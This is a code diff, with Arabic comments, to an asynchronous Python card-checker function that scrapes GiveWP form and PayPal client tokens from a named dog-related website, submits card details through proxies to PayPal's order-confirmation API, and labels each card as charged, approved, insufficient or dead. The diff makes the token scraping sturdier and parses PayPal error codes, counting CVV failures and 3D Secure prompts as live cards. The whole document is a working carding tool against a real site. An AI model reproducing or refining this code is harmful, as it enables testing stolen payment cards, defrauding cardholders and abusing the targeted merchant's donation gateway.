@@ -653,15 +653,33 @@ async def check_paypal_api(card, proxy, session):
             resp_text = await response.text()
             
         try:
-            vaa = re.search(r'name="give-form-hash" value="(.*?)"', resp_text).group(1)
-            vaa2 = re.search(r'name="give-form-id-prefix" value="(.*?)"', resp_text).group(1)
-            vaa3 = re.search(r'name="give-form-id" value="(.*?)"', resp_text).group(1)
-            vaa4 = re.search(r'"data-client-token":"(.*?)"', resp_text).group(1)
+            # استخراج قيم WP GiveWP بشكل أكثر مرونة ودقة وتفادي الفشل
+            hash_match = re.search(r'name="give-form-hash"\s+value="([^"]+)"', resp_text) or re.search(r'value="([^"]+)"\s+name="give-form-hash"', resp_text)
+            prefix_match = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', resp_text) or re.search(r'value="([^"]+)"\s+name="give-form-id-prefix"', resp_text)
+            form_id_match = re.search(r'name="give-form-id"\s+value="([^"]+)"', resp_text) or re.search(r'value="([^"]+)"\s+name="give-form-id"', resp_text)
+            
+            vaa = hash_match.group(1) if hash_match else ""
+            vaa2 = prefix_match.group(1) if prefix_match else ""
+            vaa3 = form_id_match.group(1) if form_id_match else ""
+            
+            # محرك استخراج مرن للتوكن وحمايته من التحديثات المستمرة للوردبريس
+            client_token_match = re.search(r'data-client-token="([^"]+)"', resp_text) or re.search(r'"data-client-token"\s*:\s*"([^"]+)"', resp_text)
+            if not client_token_match:
+                client_token_match = re.search(r'client-token["\']?\s*:\s*["\']([^"\']+)["\']', resp_text)
+                
+            if not client_token_match:
+                return {'status': 'Site Error', 'message': 'Client Token Not Found', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
+                
+            vaa4 = client_token_match.group(1)
             decc = base64.b64decode(vaa4)
-            dec = decc.decode('utf-8')
-            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
-        except Exception:
-            return {'status': 'Site Error', 'message': 'Token Extraction Failed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
+            dec = decc.decode('utf-8', errors='ignore')
+            
+            au_match = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
+            if not au_match:
+                return {'status': 'Site Error', 'message': 'Access Token Extraction Failed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
+            au = au_match.group(1)
+        except Exception as e:
+            return {'status': 'Site Error', 'message': f'Token Extraction Failed: {str(e)[:25]}', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
 
         url_create = "https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
         payload = {
@@ -724,64 +742,98 @@ async def check_paypal_api(card, proxy, session):
         }
         headers_paypal = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
-            'Accept-Encoding': "gzip, deflate, br, zstd",
+            'Accept': "application/json",
             'Content-Type': "application/json",
             'authorization': f"Bearer {au}",
-            'braintree-sdk-version': "3.32.0-payments-sdk-dev",
             'paypal-client-metadata-id': "563cbf8c3dd9d1a1756ef318813c3da6",
             'origin': "https://assets.braintreegateway.com",
             'referer': "https://assets.braintreegateway.com/",
-            'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+            'accept-language': "en-US,en;q=0.9",
         }
         
+        # الإرسال الرسمي لـ PayPal API وقراءة الرد الحقيقي وتحليله مباشرةً
         async with session.post(url_confirm, json=payload_confirm, headers=headers_paypal, proxy=proxy_url, timeout=API_TIMEOUT) as response_confirm:
-            await response_confirm.read()
+            confirm_status = response_confirm.status
+            confirm_text = await response_confirm.text()
 
-        url_approve = f"https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
-        async with session.post(url_approve, data=payload, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as response_approve:
-            res_approve = await response_approve.json()
+        try:
+            res_confirm = json.loads(confirm_text)
+        except Exception:
+            res_confirm = {}
 
-        if res_approve.get("success"):
-            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-
-        text = str(res_approve)
-        status_err = ""
-        if "'data': {'error': ' " in text:
-            status_err = text.split("'data': {'error': ' ")[1].split('.')[0]
-        elif "'details': [{'issue': '" in text:
-            status_err = text.split("'details': [{'issue': '")[1].split("'")[0]
-        elif "issuer is not certified. " in text:
-            status_err = text.split("issuer is not certified. ")[1].split('.')[0]
-        elif "system is unavailable.  " in text:
-            status_err = text.split("system is unavailable. ")[1].split('.')[0]
-        elif "C does not match. " in text:
-            status_err = text.split("not match. ")[1].split('.')[0]
-        elif "service is not supported. " in text:
-            status_err = text.split("service is not supported. ")[1].split('.')[0]
-        elif "'data': {'error': '" in text:
-            status_err = text.split("'data': {'error': '")[1].split('.')[0]
+        # 1. فحص هل العملية تتطلب توثيقاً ثنائياً (3D Secure)
+        is_3ds = False
+        if res_confirm.get("name") == "AUTHENTICATION_REQUIRED":
+            is_3ds = True
         else:
-            status_err = text[:100]
-            
-        sta = status_err.replace(' ', '').replace('_', ' ').title().strip()
-        sta_lower = sta.lower()
+            for link in res_confirm.get("links", []):
+                if link.get("rel") == "payer-action":
+                    is_3ds = True
+                    break
 
-        if any(k in sta_lower for k in ['insufficient', 'funds', 'balance']):
-            return {'status': 'Insufficient', 'message': sta, 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-        
-        if any(k in sta_lower for k in ['cvv', 'security code', 'not match', 'does not match', 'c does not match']):
-            return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-
-        if any(k in sta_lower for k in ['3d', 'secure', 'three d', 'otp', 'verification']):
+        if is_3ds:
             return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
 
-        if any(k in sta_lower for k in ['declined', 'refused', 'stolen', 'lost', 'restricted', 'do not honor', 'expired', 'invalid number', 'suspected fraud']):
-            return {'status': 'Dead', 'message': sta, 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+        # 2. استخراج وفك رموز الأخطاء الرسمية مباشرةً من مصفوفة الردود لـ PayPal
+        details = res_confirm.get("details", [])
+        if details:
+            issue = str(details[0].get("issue", "")).upper()
+            
+            if issue == "INSTRUMENT_DECLINED":
+                return {'status': 'Dead', 'message': 'Card Declined (Instrument Declined)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            elif issue == "CREDIT_CARD_CVV_CHECK_FAILED":
+                return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            elif issue == "INSUFFICIENT_FUNDS":
+                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            elif issue == "CARD_EXPIRED":
+                return {'status': 'Dead', 'message': 'Card Expired', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            elif issue == "TRANSACTION_LIMIT_EXCEEDED":
+                return {'status': 'Dead', 'message': 'Transaction Limit Exceeded', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            elif issue == "PAYMENT_SOURCE_INFO_CANNOT_BE_VERIFIED":
+                return {'status': 'Dead', 'message': 'Card Info Cannot Be Verified', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            elif issue == "PAYMENT_SOURCE_DECLINED_BY_API":
+                return {'status': 'Dead', 'message': 'Declined by PayPal API', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            else:
+                return {'status': 'Dead', 'message': f'{issue.replace("_", " ").title()}', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
 
-        if any(k in sta_lower for k in ['system unavailable', 'error', 'timeout', 'gateway error', 'issue']):
-            return {'status': 'Site Error', 'message': sta, 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
+        # 3. فحص الأخطاء النصية العامة من الاسم المرجعي للخطأ
+        error_name = res_confirm.get("name")
+        if error_name:
+            err_msg = res_confirm.get("message", error_name)
+            if "DECLINED" in error_name or "DECLINED" in err_msg.upper():
+                return {'status': 'Dead', 'message': 'Card Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            if "CVV" in error_name or "CVV" in err_msg.upper():
+                return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            if "EXPIRED" in error_name or "EXPIRED" in err_msg.upper():
+                return {'status': 'Dead', 'message': 'Card Expired', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
 
-        return {'status': 'Dead', 'message': sta if sta else 'Transaction Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+        if confirm_status >= 400:
+            confirm_text_lower = confirm_text.lower()
+            if "declined" in confirm_text_lower:
+                return {'status': 'Dead', 'message': 'Card Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            if "cvv" in confirm_text_lower:
+                return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            if "insufficient" in confirm_text_lower:
+                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            return {'status': 'Dead', 'message': f'PayPal Confirm Error ({confirm_status})', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+
+        # 4. معالجة حالة النجاح في حال كان الطلب سليماً بالكامل (APPROVED / COMPLETED)
+        order_status = str(res_confirm.get("status", "")).upper()
+        if confirm_status in [200, 201, 202] or order_status in ["APPROVED", "COMPLETED"]:
+            url_approve = f"https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
+            try:
+                async with session.post(url_approve, data=payload, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as response_approve:
+                    res_approve = await response_approve.json()
+                    
+                if res_approve.get("success"):
+                    return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+                else:
+                    wp_err = str(res_approve.get("data", {}).get("error", "Transaction Failed")).strip()
+                    return {'status': 'Dead', 'message': wp_err, 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+            except Exception:
+                return {'status': 'Approved', 'message': 'Order Confirmed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+
+        return {'status': 'Dead', 'message': 'Transaction Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
 
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'PayPal API Timeout', 'card': card, 'gateway': 'PayPal Commerce', 'price': '1.00', 'retry': True}
